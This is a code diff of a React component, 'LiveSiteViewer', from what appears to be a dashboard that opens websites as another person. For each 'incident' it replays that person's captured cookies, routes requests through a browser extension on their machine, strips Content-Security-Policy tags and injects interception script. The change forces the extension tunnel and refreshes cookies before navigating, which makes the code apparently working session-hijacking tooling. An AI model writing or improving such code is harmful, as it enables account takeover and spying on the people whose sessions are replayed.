@@ -136,39 +136,13 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
     }
   }, [incident.full_cookie_data, incident.cookie_data, (incident as any).cookie_excerpt, (incident as any).cookieExcerpt, incident.host]);
 
-  // Fetch raw content - tries site-proxy first, then extension as fallback
-  const fetchRawContent = async (url: string): Promise<string> => {
+  // Fetch raw content - ALWAYS use extension tunnel (forced)
+  const fetchRawContent = async (url: string, overrideCookies?: any[]): Promise<string> => {
     const proxyIncidentId = incidentIdForProxy || incident.id;
+    const cookiesToUse = overrideCookies || cookies;
     
-    // Try site-proxy first (fast for public sites)
-    try {
-      console.log('[LocalProxy] Trying site-proxy for:', url);
-      
-      const response = await fetch(`${PROXY_BASE}?incident=${proxyIncidentId}`, {
-        method: 'POST',
-        headers: { 
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          url,
-          cookies: cookies,
-          rawContent: true
-        })
-      });
-      
-      if (response.ok) {
-        console.log('[LocalProxy] ✅ site-proxy succeeded');
-        return await response.text();
-      }
-      
-      // If 403 or 500, try extension fallback
-      console.log(`[LocalProxy] site-proxy failed (${response.status}), trying extension...`);
-    } catch (proxyError) {
-      console.log('[LocalProxy] site-proxy error, trying extension:', proxyError);
-    }
-    
-    // Fallback: Use extension proxy (works with user's IP)
     console.log('[ExtensionProxy] Requesting fetch via extension');
+    console.log('[ExtensionProxy] Using cookies count:', cookiesToUse.length);
     
     // Normalize machine_id (handle both snake_case and camelCase)
     const targetMachineId = incident.machine_id || (incident as any).machineId;
@@ -201,7 +175,7 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
         status: 'pending',
         payload: {
           target_url: url,
-          cookies: cookies
+          cookies: cookiesToUse
         },
         executed_by: (await supabase.auth.getUser()).data.user?.id
       })
@@ -225,7 +199,7 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
         target_tab_id: activeSession.tab_id,
         payload: {
           target_url: url,
-          cookies: cookies
+          cookies: cookiesToUse
         }
       }
     });
@@ -287,8 +261,9 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
   };
 
   // Process HTML content locally: rewrite URLs and inject interception script
-  const processContent = (html: string, baseUrl: string): string => {
+  const processContent = (html: string, baseUrl: string, assetsMode: 'direct' | 'proxy' = 'direct'): string => {
     console.log('[LocalProxy] Processing content for:', baseUrl);
+    console.log('[LocalProxy] Assets mode:', assetsMode);
     
     const base = new URL(baseUrl);
     const origin = `${base.protocol}//${base.host}`;
@@ -296,43 +271,59 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
     
     let processed = html;
     
-    // Rewrite CSS links
-    processed = processed.replace(
-      /(<link[^>]+href=["'])([^"']+)(["'][^>]*>)/gi,
-      (match, prefix, url, suffix) => {
-        try {
-          const absolute = new URL(url, origin).href;
-          const proxied = `${PROXY_BASE}?url=${encodeURIComponent(absolute)}&incident=${proxyIncidentId}&rawContent=true`;
-          return `${prefix}${proxied}${suffix}`;
-        } catch { return match; }
-      }
-    );
+    // Inject <base href> into <head> to fix relative URLs
+    const baseTag = `<base href="${origin}">`;
+    if (processed.includes('</head>')) {
+      processed = processed.replace('</head>', `${baseTag}\n</head>`);
+      console.log('[LocalProxy] Injected <base href="' + origin + '">');
+    } else if (processed.includes('<head>')) {
+      processed = processed.replace('<head>', `<head>\n${baseTag}`);
+      console.log('[LocalProxy] Injected <base href="' + origin + '"> in head');
+    }
     
-    // Rewrite Scripts
-    processed = processed.replace(
-      /(<script[^>]+src=["'])([^"']+)(["'][^>]*>)/gi,
-      (match, prefix, url, suffix) => {
-        try {
-          const absolute = new URL(url, origin).href;
-          const proxied = `${PROXY_BASE}?url=${encodeURIComponent(absolute)}&incident=${proxyIncidentId}&rawContent=true`;
-          return `${prefix}${proxied}${suffix}`;
-        } catch { return match; }
-      }
-    );
+    // Remove CSP that might block resources
+    processed = processed.replace(/<meta[^>]+http-equiv=["']Content-Security-Policy["'][^>]*>/gi, '');
     
-    // Rewrite Images
-    processed = processed.replace(
-      /(<img[^>]+src=["'])([^"']+)(["'])/gi,
-      (match, prefix, url, suffix) => {
-        try {
-          const absolute = new URL(url, origin).href;
-          const proxied = `${PROXY_BASE}?url=${encodeURIComponent(absolute)}&incident=${proxyIncidentId}&rawContent=true`;
-          return `${prefix}${proxied}${suffix}`;
-        } catch { return match; }
-      }
-    );
+    // Only rewrite assets if using proxy mode (not direct from extension)
+    if (assetsMode === 'proxy') {
+      // Rewrite CSS links
+      processed = processed.replace(
+        /(<link[^>]+href=["'])([^"']+)(["'][^>]*>)/gi,
+        (match, prefix, url, suffix) => {
+          try {
+            const absolute = new URL(url, origin).href;
+            const proxied = `${PROXY_BASE}?url=${encodeURIComponent(absolute)}&incident=${proxyIncidentId}&rawContent=true`;
+            return `${prefix}${proxied}${suffix}`;
+          } catch { return match; }
+        }
+      );
+      
+      // Rewrite Scripts
+      processed = processed.replace(
+        /(<script[^>]+src=["'])([^"']+)(["'][^>]*>)/gi,
+        (match, prefix, url, suffix) => {
+          try {
+            const absolute = new URL(url, origin).href;
+            const proxied = `${PROXY_BASE}?url=${encodeURIComponent(absolute)}&incident=${proxyIncidentId}&rawContent=true`;
+            return `${prefix}${proxied}${suffix}`;
+          } catch { return match; }
+        }
+      );
+      
+      // Rewrite Images
+      processed = processed.replace(
+        /(<img[^>]+src=["'])([^"']+)(["'])/gi,
+        (match, prefix, url, suffix) => {
+          try {
+            const absolute = new URL(url, origin).href;
+            const proxied = `${PROXY_BASE}?url=${encodeURIComponent(absolute)}&incident=${proxyIncidentId}&rawContent=true`;
+            return `${prefix}${proxied}${suffix}`;
+          } catch { return match; }
+        }
+      );
+    }
     
-    // Rewrite anchors (for navigation) - keep original URLs without data attributes
+    // Always rewrite anchors and forms for navigation interception (make them absolute)
     processed = processed.replace(
       /(<a\s[^>]*href=["'])([^"']+)(["'][^>]*>)/gi,
       (match, prefix, url, suffix) => {
@@ -422,14 +413,15 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
   };
 
   // Handle navigation within the proxied site
-  const handleNavigation = async (targetUrl: string) => {
+  const handleNavigation = async (targetUrl: string, overrideCookies?: any[]) => {
     console.log('[LocalProxy] Navigating to:', targetUrl);
     setError(null);
     setCurrentUrl(targetUrl);
     
     try {
-      const rawHtml = await fetchRawContent(targetUrl);
-      const processedHtml = processContent(rawHtml, targetUrl);
+      const rawHtml = await fetchRawContent(targetUrl, overrideCookies);
+      // Always use 'direct' mode since we're forcing extension tunnel
+      const processedHtml = processContent(rawHtml, targetUrl, 'direct');
       
       // Update iframe with new content
       setIframeKey(k => k + 1);
@@ -504,6 +496,7 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
           });
 
           // Poll incident for fresh cookies (up to ~10s)
+          let freshCookies: any[] | null = null;
           let attempts = 0;
           let cookieCount = 0;
           while (attempts < 7) {
@@ -514,18 +507,35 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
               .single();
 
             const src = (updated as any)?.full_cookie_data ?? (updated as any)?.cookie_excerpt;
-            if (Array.isArray(src)) {
-              cookieCount = src.length;
-            } else if (typeof src === 'string' && src.includes('=')) {
-              cookieCount = src.split(';').filter(Boolean).length;
+            
+            // Parse fresh cookies
+            if (src) {
+              try {
+                let parsedData = typeof src === 'string' ? JSON.parse(src) : src;
+                if (Array.isArray(parsedData)) {
+                  freshCookies = parsedData.filter(c => c && c.name && c.value);
+                  cookieCount = freshCookies.length;
+                } else if (typeof src === 'string' && src.includes('=')) {
+                  cookieCount = src.split(';').filter(Boolean).length;
+                }
+              } catch (e) {
+                console.error('Error parsing fresh cookies:', e);
+              }
             }
 
             if (cookieCount > 10) break;
             await new Promise(r => setTimeout(r, 1500));
             attempts++;
           }
+          
           console.log(`Fresh cookies ready: ~${cookieCount} items`);
-          if (cookieCount > 0) toast.success(`Cookies atualizados: ${cookieCount}`);
+          if (freshCookies && freshCookies.length > 0) {
+            console.log('[LocalProxy] Using', freshCookies.length, 'fresh cookies for extension proxy');
+            setCookies(freshCookies);
+            toast.success(`Cookies atualizados: ${freshCookies.length}`);
+          } else if (cookieCount > 0) {
+            toast.success(`Cookies atualizados: ${cookieCount}`);
+          }
         }
       }
     } catch (error) {
@@ -533,6 +543,8 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
       // Continue with existing cookies
     }
 
+    // Wait a bit for setCookies to update state, then navigate
+    await new Promise(resolve => setTimeout(resolve, 100));
     await handleNavigation(incident.tab_url);
   };
 
